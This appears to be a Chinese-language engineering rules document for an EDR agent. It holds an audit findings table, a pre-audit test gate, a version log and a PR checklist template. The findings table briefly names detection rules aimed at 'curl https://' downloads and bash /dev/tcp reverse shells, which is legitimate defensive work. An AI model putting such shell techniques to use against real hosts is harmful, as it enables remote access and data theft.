| 日期 | 规则编号 | 反例位置 | 修复 PR | 状态 |
|---|---|---|---|---|
| 2026-06-04 | R-S1 | `configs/policy.json` P001 命中 F07 (`curl https://`) | 待修 | 🔴 open |
| 2026-06-04 | R-S2 | `configs/policy.json` P005 全路径精确匹配 | 待修 | 🔴 open |
| 2026-06-04 | R-S3 | `configs/policy.json` P003 只挡 bash /dev/tcp | 待修（按 R-S3 拆 N 条） | 🔴 open |
| 2026-06-04 | R-S4 | `configs/policy.json` P006 time_window 00:00-23:59 永真 | 待修 | 🔴 open |
| 2026-06-04 | R-S5 | `configs/policy.json` P001 whitelist `apt` 太宽 | 待修 | 🔴 open |
| 2026-06-04 | R-S6 | `configs/policy.json` N001 decision=alert + action=nft_block 语义重叠 | 待修（v0.16 一起） | 🔴 open |
| 2026-06-04 | R-P1 | allowed_uids 在三处不一致 | Agent F: code default [0], agent.json dev override [1000] annotated, comment stripping in loadConfig | ✅ fixed |
| 2026-06-04 | R-P2 | NFT dry_run=true / kill dry_run=false 不一致 | Agent F: loadConfig() global DryRun default changed to true; agent.json dry_run=false is dev override | ✅ fixed |
| 2026-06-04 | R-P3 | 资源上限散落 5 处 | 待修 | 🔴 open |
| 2026-06-04 | R-C1 | `CAP_SYS_PTRACE` 未用却保留 | Agent F: removed from CapabilityBoundingSet, added code-location comments for each retained capability | ✅ fixed |
| 2026-06-04 | R-C2 | `policy.json` 走 `json.Unmarshal` 不限大小、不拒未知字段 | 待修 | 🔴 open |
| 2026-06-04 | R-K1 | `go appendResponseRecord` fire-and-forget | 待修 | 🔴 open |
| 2026-06-04 | R-K4 | `os.Hostname()` 每次 Write 重新读 | Agent F: cachedHostname/cachedUID/cachedBootID sampled at startup in main(); emitStartupVerify uses cached values; Agent C handles Logger side | ✅ fixed |
| 2026-06-04 | R-SCHEMA1 | `Process.User` 字段空挂 | 待修 | 🔴 open |
| 2026-06-04 | R-CLI1 | `verify-m3-report.json` 不带 timestamp/commit | Agent F: Makefile verify-m3 injects generated_at/agent_commit/agent_version/kernel; audit-ready echoes full stamp | ✅ fixed |
| 2026-06-04 | R-CLI2 | F07 误报多轮未修 | 待修 | 🔴 open |
| 2026-06-04 | R-CLI4 | M3 报告 `FP=1` 被 `FP≤2` 阈值"放行",且已知 issue 无 owner | 待建 `audit/known-issues.md` + 12 项 `audit-ready` 清单 | 🔴 open |
| 2026-06-04 | R-CLI4 | v0.15 verify 不重跑 M3 样本,可能 v0.1 回归未捕获 | 待加 `make verify-regression` 重跑历史样本 | 🔴 open |
| 2026-06-04 | R-CLI4 | 抑制器重启清零等已知短板无自动化测试 | 待加短板对应的 regression 测试 | 🔴 open |
| 2026-06-04 | R-O1 | v0.15 baseline 抓出 30+ 处 `_ =` 模式,经 R-O1 0.2 版澄清后归类为: 真违规 0(已修 `agent.go:167` + `event.go:80`)+ Go 惯例 ~11(defer Close)+ best-effort 解析 ~15(ReadFile/parseInt)+ fire-and-forget ~6(Logger.Write)| 已用 `errcheck -blank -ignoretests` 过滤, 剩余登记为 R-O1 backlog | 🟡 in-progress |
| 2026-06-04 | R-O1 | `agent.go:167` `_, _ = f.Write(append(raw, '\n'))` 显式双丢弃 | 已修为 `fmt.Fprintf(os.Stderr, ...)` + 注释 | ✅ fixed |
| 2026-06-04 | R-O1 | `event.go:80` `host, _ := os.Hostname()` 静默吞 err | 已修为 `if host, err := os.Hostname(); err == nil` | ✅ fixed |
| 2026-06-04 | R-K4 | `os.Hostname()` 每次 Write 重读(已记 R-K4,本次只去静默) | Agent F: cachedHostname/cachedUID/cachedBootID in main.go; Logger side pending Agent C | ✅ fixed |
| 2026-06-04 | R-CLI1 | `audit/verify-m3-report.json` 缺 `generated_at/commit/agent_version` | Agent F: post-processing step in verify-m3 target injects all four stamp fields | ✅ fixed |
| 2026-06-04 | R-CLI1 | `Makefile` 的 `fmt` 目标无版本 pin → gofumpt upstream v0.10 要求 Go 1.25,工具链 1.22 解析失败 gate 假绿 | 已 pin `mvdan.cc/gofumpt@v0.7.0` (`GOFUMPT ?= ...`),R-CLI1 复跑性靠显式版本 | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 `vmlinux.h` 是 host-kernel 绑定的 162K 行 C 头,绝不能进 VCS;`bpftool gen object` 的 link/relocate 才能验 .bpf.o 自包含 | 已加 `.gitignore` + `bpf-verify` Makefile 目标 + `bpf-vmlinux` stamp 规则 | ✅ fixed |
| 2026-06-04 | R-P2 | v0.2 ring0 上线后 `bpf.enabled` 必须默认 `false`(避免 dev/CI 误开 CAP_BPF 全无功能) | 已在 `configs/agent.json` 写 `enabled: false`,`loadConfig` 缺省走零值,`startBPFLoader` 对 disabled 直接 `(nil, nil)` | ✅ fixed |
| 2026-06-04 | R-C1 | v0.2 启 BPF 时若加载失败,必须 fail-fast,绝不能静默回退到 procfs-only(operator 看到 ring0 关闭的报警渠道) | `startBPFLoader` 任何 err 都 `fatal()`;libbpf loader 自身未到位时返回明确 "not yet wired" err,不静默吞 | ✅ fixed |
| 2026-06-04 | R-O1 | `bpf.FakeLoader.InjectError` 满载静默 drop(只 send + default) | 设计如此:Errors() 是 best-effort 观测 sink,R-O1 的"必须有 log 通道"由真实 loader 把 libringbuf 错误转写到 stderr/audit 满足;FakeLoader 单测 `TestFakeLoader_InjectErrorDropsOnFull` 显式锁定此行为 | 🟢 documented |
| 2026-06-04 | R-SCHEMA1 | `bpf.Event` 与 C 端 `edr_event` 必须 byte-layout 一致(否则 Go 读 ringbuf 解析错位) | `internal/bpf/probes/common.bpf.h` 顶部注释 + R-L3 文档化为 binary contract;`internal/bpf/event.go` 字段顺序与 C 端一致;后续任何修改需 bump SchemaVersion | 🟢 documented |
| 2026-06-04 | R-K2 | v0.2 `MergedCollector.drainBPF` 持锁调用 channel receive 会冻死 Snapshot | drainBPF 不持锁,只在 counter 写时短锁;`BPFHealth` 是值拷贝返回;单测 `TestMergedCollector_NonBlockingDrainDoesNotStallOnSlowBPF` 锁住"加 BPF 不引入额外延迟"的契约 | ✅ fixed |
| 2026-06-04 | R-CLI2 | v0.2 改 Snap.Connections 加 `RemotePort` 字段 — 旧 procfs 解析丢弃 remote port 是隐性数据丢失,新字段让 BPF/规则可观察 | 字段加 `omitempty` 保二进制兼容;`collect.go` 的 `readNet` 同步把丢弃的 port 填回去 | 🟡 in-progress |
| 2026-06-04 | R-CLI1 | v0.2 cgo 预编译头里 C 调 `edr_deliver_event` 时缺前置 `extern` 声明 → 编译期 `-Wimplicit-function-declaration` 警告(未升级为 error),Go `//export` 不能反向替 C 端消掉该警告 | 在 cgo preamble 显式加 `extern int edr_deliver_event(void *ctx, void *data, size_t size);`;R-CLI1 要求 gate 必须能无 warning 通过而不是靠"编译器没升级" | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 cgo 把 `libbpf_loader.c` 作为独立 C 文件 import 时,cgo 同时生成 `_cgo_export.c` 和 per-file wrapper,两个都会 include preamble → "multiple definition" 链接错误 | C bridge 全部 inline 到 cgo preamble,删掉独立 .c/.h;R-CLI1:任何 cgo build 步骤都要默认走单 include 路径 | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 libbpf 1.0+ ring buffer 回调签名去掉 `cpu` 参数 (`int (*)(void *ctx, int cpu, void *data, __u32 size)` → `int (*)(void *ctx, void *data, size_t size)`)。直接拷老 libbpf 教程代码 → 链接时 "conflicting types" | 头文件 + preamble + Go `//export` 三处签名都按 v1.0+ 写;R-CLI1:依赖 libbpf 的代码要 pin libbpf 主版本号,不可飘 | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 cgo 没有 `C.unsigned int` 这种"单词类型别名",直接用 `C.unsigned int` 在 C 签名里报 "missing ',' in parameter list" | 改用 `C.size_t` / `C.uint` / `C.int` 等有 cgo 转换的命名类型;R-CLI1:cgo C 端类型只用 cgo docs 明确支持的子集,自定义 `_t` 走 typedef | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 多个 per-probe `.bpf.o` 各自 `struct { __uint(type, BPF_MAP_TYPE_RINGBUF); ... } events __attribute__((...))` — `bpftool gen object` 合并时 symbol 冲突,link 失败 | `events` 加 `__attribute__((weak))`,`bpftool gen object` 自动去重;R-CLI1:任何合并/链接步骤都要在 Makefile target 里可复跑 | ✅ fixed |
| 2026-06-04 | R-CLI1 | v0.2 默认 `go build` (no `-tags bpf`) 走 stub `startBPFLoader` 返回 "not yet wired";`-tags bpf` 走 cgo 真 loader。两路必须都进 `audit-ready` 链,否则 cgo 路径回退没人会注意 | Makefile 加 `build-bpf` 目标走 `go build -tags bpf`,`audit-ready` 同时依赖 `build` 和 `build-bpf`;R-CLI1:多 build path 的项目,每条 path 都要进 gate | ✅ fixed |
| 2026-06-04 | R-C1 | v0.2 部署方在 dev/CI 主机(CAP_BPF=0)上跑 `audit-ready`,BPF 加载一定失败 — 但 gate 必须 fail-loud,不能让 `go test ./...` 假绿让人误以为 BPF 路径正常 | CAP_BPF=0 时 `bpf-link` / `bpf-verify` (纯 clang + bpftool,不需要内核加载) 仍能跑通,作为 BPF 路径可达性的"产物链"证据;真正 `bpf_object__load` 要在 root VM 上跑;R-C1:gate 的"绿"必须能区分"产物存在"和"运行时加载成功"两层 | ✅ fixed |
| 2026-06-04 | R-O1 | v0.2 ring buffer 回调 (`edr_deliver_event`) 跑在 softirq context,绝对不能阻塞。Go channel 满时必须 drop+回 -1(libbpf 内部计数) + 在 `Errors()` 留记号 | 回调函数用 `select { case l.out <- ev: ...; default: return -1 }`;Errors 满再 drop(Errors 自身也是 best-effort 观测 sink);`TestFakeLoader_InjectErrorDropsOnFull` 锁住契约;R-O1:softirq/中断上下文的代码不能假设 goroutine 可阻塞 | ✅ fixed |
| 2026-06-04 | R-SCHEMA1 | v0.2 ring buffer payload 是固定 330-byte C struct;Go 端 `ParseEvent` 必须按同一 layout 解析(每个 const offset 对得上)。任何字段顺序/大小变化 = 隐式 corruption | 解析器所有 offset/size 都从 const 表读,与 `common.bpf.h` 注释里的 layout 表一一对应;`TestParseEvent_*` 12 个用例覆盖 v4/v6/未支持 family/超长 buffer/NUL 截断/UTC 时间戳;任何 layout 变更必须同时改 C 端 struct 注释 + Go 端 const + 至少 1 个 fixture | 🟢 documented |

---

## 10. 规则维护流程

### 何时新增一条铁律

任一即可触发：

1. **外部审计报告**（M3 报告 / verify-v015 / Code Review / 渗透测试）发现一个系统性问题
2. **同一个 bug 在 ≥2 个模块复现**（说明不是个案，是规范缺失）
3. **新提交的 PR 在评审中被同一条意见反复要求**（说明规则没沉淀）

### 何时降级 / 删除一条铁律

- 业务背景变化（如该铁律的 case 已不可能再发生）
- 出现更通用的上级铁律涵盖之
- 必须有 issue / PR 论证

### 每次 PR 必须做的"前置 5 秒"

```bash
# 设计/开发前 5 秒速查
cat audit/DEV_IRON_RULES.md | grep -E "^### R-" | head -33
# 问自己: 本次 PR 触发了哪条? 怎么遵循?

# 触发审计/PR-review/发版时
make audit-ready
# 粘贴 12 项输出 + 3 项人工 ✅ 到 PR 描述
```

### CI 自动校验（建议实现）

| 检查 | 工具 | 触发 |
|---|---|---|
| 禁用 `_ =` 静默错误 | `errcheck` | `make lint` |
| JSON 反序列化必须 DisallowUnknownFields | `go vet -jsonfieldcheck`(自写) | `make lint` |
| policy.json 默认值与代码一致 | diff-based | `make verify-configs` |
| 资源上限集中在 limits.go | `go vet -limitscheck`(自写) | `make lint` |
| 抑制器 / chain 状态持久化 | 集成测试 | `make verify-v016` |

### 10.4 审计前置测试门禁（R-CLI4 详细流程）

> **铁律**：每次审计启动前必须先证明测试基线全绿。审计包含但不限于：
> - 外部审计方入场（渗透测试 / 安全评估 / 合规检查）
> - 内部 M3 / verify-v015 门禁复跑
> - PR Review
> - 新版本发布（v0.16 / v0.2 / v0.3 …）
> - 季度回归

#### 10.4.1 必须前置完成的 12 项硬测试

```bash
# 一键前置检查（建议注册为 make audit-ready）
make audit-ready
```

| # | 检查 | 命令 | 通过判据 |
|---|---|---|---|
| 1 | 全量单元测试 | `go test -race ./...` | exit 0，零 race |
| 2 | 全量编译 | `go build ./cmd/edr-agent ./cmd/edrctl` | exit 0 |
| 3 | 静态分析 | `go vet ./...` | exit 0 |
| 4 | 格式检查 | `gofmt -l .` | 无输出 |
| 5 | 静默错误扫描 | `errcheck ./...` | 无 `_ =` 漏出 |
| 6 | M3 回归 | `make verify-m3` | `passed=true` **且** `FP=0` |
| 7 | 当前版端到端 | `make verify-v015`（或对应版本） | exit 0 |
| 8 | 抑制器 | `bash scripts/test_suppression.sh` | exit 0 |
| 9 | 链持久化 | `bash scripts/test_chain_persistence.sh` | exit 0 |
| 10 | 取证导出 | `bash scripts/test_reset.sh` | exit 0 |
| 11 | 场景 | `bash scripts/test_v015_scenarios.sh` | exit 0 |
| 12 | systemd 语法 | `systemd-analyze verify systemd/edr-agent.service` | exit 0 |

#### 10.4.2 必须前置完成的 3 项人工检查

| # | 检查 | 通过判据 |
|---|---|---|
| H1 | `audit/known-issues.md` 所有 open 项有 owner + ETA | 无空行 |
| H2 | 本次 PR/版本涉及的 R-X 铁律在描述里列了"如何遵守" | 描述有 R-X 引用 |
| H3 | 若需"带已知 FP 通过"，reviewer 显式 ack | PR 有 `Ack-by:` 标记 |

#### 10.4.3 通过的 4 步流程

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: 跑 audit-ready (12 硬测试)                          │
│   全部 exit 0 ──▶ 进 Step 2                                  │
│   任一非 0 ──▶ 停止,先修测试,再申请审计                      │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 2: 跑人工 3 项 (H1/H2/H3)                              │
│   全部 ✅ ──▶ 进 Step 3                                      │
│   任一 ❌ ──▶ 停止,补 owner / 补 R-X 引用 / 补 ack           │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 3: 在 PR / 审计报告里贴 audit-ready 输出               │
│   输出必须含:                                                  │
│     - 12 项 exit code                                        │
│     - timestamp                                              │
│     - git commit sha                                         │
│     - go version                                             │
│     - kernel version                                         │
│   这块就是 §R-CLI1 强制要求的 audit report stamp            │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 4: 审计正式开始                                          │
│   审计方在报告里交叉引用 Step 3 的 stamp 作为基线           │
│   任何审计新发现 → 走 R-CLI2(事后修)闭环                    │
└─────────────────────────────────────────────────────────────┘
```

#### 10.4.4 失败的处理矩阵

| 失败位置 | 处理 |
|---|---|
| Step 1 任一不过 | **不允许审计**。先修测试，audit-ready 全绿后再申请。 |
| Step 2 H1 不过 | 给 open issue 派 owner + ETA 后重审 |
| Step 2 H2 不过 | 补 R-X 引用 + 一句话遵守说明 |
| Step 2 H3 不过 | 走 reviewer ack 流程 |
| Step 3 缺 stamp | 重跑 audit-ready，复制完整输出 |
| 审计进行中测试变红 | **暂停审计**，先修测试，再恢复。已审计部分作废重审 |
| 审计后发现未跑的测试 | 走 R-CLI2 流程：登记 known-issue + 派 owner + ETA |

#### 10.4.5 例外条款

- 例外必须**同时**满足 3 条：
  1. PR 描述里**显式列**出"为什么这次不能 12 项全绿"
  2. 至少 1 个 reviewer 显式 `Ack-by: <name>`
  3. 同一例外 ≤ 1 个 sprint 有效，到期未转正则回退
- **不允许例外**：审计方要求"必须全绿"的项目（M3 门禁、verify-*、外部审计入场）

#### 10.4.6 与 R-CLI2 闭环

```
        ┌───────────────────────┐
        │ 审计前:  R-CLI4       │  ← 12 项硬测试 + 3 项人工 全绿
        │ audit-ready 全绿      │
        └───────────┬───────────┘
                    │ 才允许审计
                    ▼
        ┌───────────────────────┐
        │ 审计中: 收集 findings │
        └───────────┬───────────┘
                    │
                    ▼
        ┌───────────────────────┐
        │ 审计后:  R-CLI2       │  ← 任何 FP/FN 进 known-issues,
        │ 修复 + re-run gate    │     sprint 内必须修
        └───────────────────────┘
```

R-CLI4 是"事前锁基线"，R-CLI2 是"事后追修复"。两者缺一就会要么"基线漂了不知道"要么"发现问题不修"。

---

## 11. 版本与变更

| 版本 | 日期 | 变更 | 触发原因 |
|---|---|---|---|
| 0.1 | 2026-06-04 | 首次沉淀：32 条铁律（M3 报告 + PROJECT_STATUS + 代码复盘） | 用户要求建立开发规范 |
| 0.2 | 2026-06-04 | + R-CLI4 "审计前必完成所有必要测试" 流程级铁律 + §10.4 详细清单 + 附录 B audit-ready 模板 | 用户要求"每次审计前必须完成所有必要测试"硬化为流程 |
| 0.3 | 2026-06-04 | R-O1 加"适用范围澄清"(真违规 vs Go 惯例 vs best-effort)+ 建议 errcheck 命令; 抓出 30+ `_ =` 模式, 修 2 个真违规, 其余 28 个登记为 R-O1 backlog | eBPF 工具链落地后跑 audit-ready 12 项触发 |

---

## 附录 A：与 PROJECT_STATUS.md 章节的对应

| 本文 | PROJECT_STATUS.md | 关系 |
|---|---|---|
| R-S1~R-S8 | §3.4 策略层 + §14.3 已知短板 | 策略层规范 |
| R-P1~R-P4 | §5 当前安全加固 + §14.3 已知短板 | 配置层规范 |
| R-C1~R-C4 | §5 控制面 + 路径安全 + 响应安全 | 控制面/路径/能力规范 |
| R-K1~R-K4 | （未单列，散落） | 并发与一致性规范 |
| R-L1~R-L4 | §3.7 eventlog + §6 日志完整性 + §12 v0.15 增量 1 | 审计层规范 |
| R-O1~R-O3 | §7 当前验证结果 + §14.3 | 可靠性规范 |
| R-SCHEMA1~R-SCHEMA2 | §14.1 已实现模块表 | API 规范 |
| R-CLI1~R-CLI4 | §7 验证 + §14.3 已知短板 + §10.4 审计前置流程 | CI/门禁规范 |

## 附录 B：使用清单（贴在每个 PR 模板顶部）

```markdown
## PR 前置检查（每项必须 ✅ 或写"不适用 + 理由"）

- [ ] 已通读 `audit/DEV_IRON_RULES.md` §0 速查表
- [ ] 本 PR 触发的铁律已在 PR 描述里列出（编号 + 如何遵守）
- [ ] 新增代码无 `_ =` 静默错误（R-O1）
- [ ] 新增路径输入过 safePath 校验（R-C3）
- [ ] 新增 `go func()` 有 shutdown + error sink（R-K1）
- [ ] 新增 JSON 反序列化有 size limit + DisallowUnknownFields（R-C2）
- [ ] 新增默认值在 配置/代码/文档 一致（R-P1）
- [ ] 新增规则带 ≥1 正向 + ≥1 反向 fixture（R-S8）
- [ ] `make verify-m3` / `make verify-v015` 通过
- [ ] 若新增 audit 事件，SchemaVersion 是否需要 bump（R-L3）

## Audit-Ready 清单（R-CLI4 · 触发审计/PR-review/发版时必跑）

PR 涉及以下任一场景时，必须先跑 `make audit-ready` 并粘贴输出：
- 修改了 `internal/collector/`, `internal/policy/`, `internal/response/` 中任一文件
- 修改了 `configs/policy.json` 或 `configs/agent.json`
- 修改了 `cmd/edr-agent/main.go` 或 `cmd/edrctl/main.go`
- 修改了 `systemd/edr-agent.service` 或 `scripts/install.sh`
- 新增 / 删除了任意测试样本（`testdata/samples/`、`testdata/policies/`）
- 准备发版 / 触发外部审计

### 12 项硬测试（必须全绿）

```
$ make audit-ready
[1/12] go test -race ./...                                          ✓ 0.42s
[2/12] go build ./cmd/edr-agent ./cmd/edrctl                        ✓ 1.31s
[3/12] go vet ./...                                                 ✓ 0.18s
[4/12] gofmt -l .                                                   ✓ (empty)
[5/12] errcheck ./...                                               ✓ 0 issues
[6/12] make verify-m3                                               ✓ passed=true FP=0
[7/12] make verify-v015                                             ✓ exit 0
[8/12] bash scripts/test_suppression.sh                             ✓ all green
[9/12] bash scripts/test_chain_persistence.sh                       ✓ all green
[10/12] bash scripts/test_reset.sh                                  ✓ all green
[11/12] bash scripts/test_v015_scenarios.sh                         ✓ all green
[12/12] systemd-analyze verify systemd/edr-agent.service            ✓ exit 0
audit-ready: ✅ ALL GATES GREEN at 2026-06-04T10:23:45Z
             commit=edr-2d2b471 go=go1.22.0 kernel=6.17.0-29-generic
```

### 3 项人工检查

- [ ] H1: `audit/known-issues.md` 中所有 open 项有 owner + ETA
- [ ] H2: 本 PR 涉及的 R-X 铁律在描述里列了"如何遵守"
- [ ] H3: 若需"带已知 FP 通过",reviewer 已 `Ack-by: <name>`

### 例外申请（仅在 12 项中确有不可临时修的项目时填写）

```
Exception: 第 7 项 verify-v015 当前为红
原因: v0.16 WIP 分支,chain 格式未稳
影响范围: 不影响 PR 实际审查内容
替代验证: 已加 `make verify-v016-wip` 跑核心 4 个断言
Ack-by: alice
到期日: 2026-06-30  · 之后不允许再有此例外
```
```
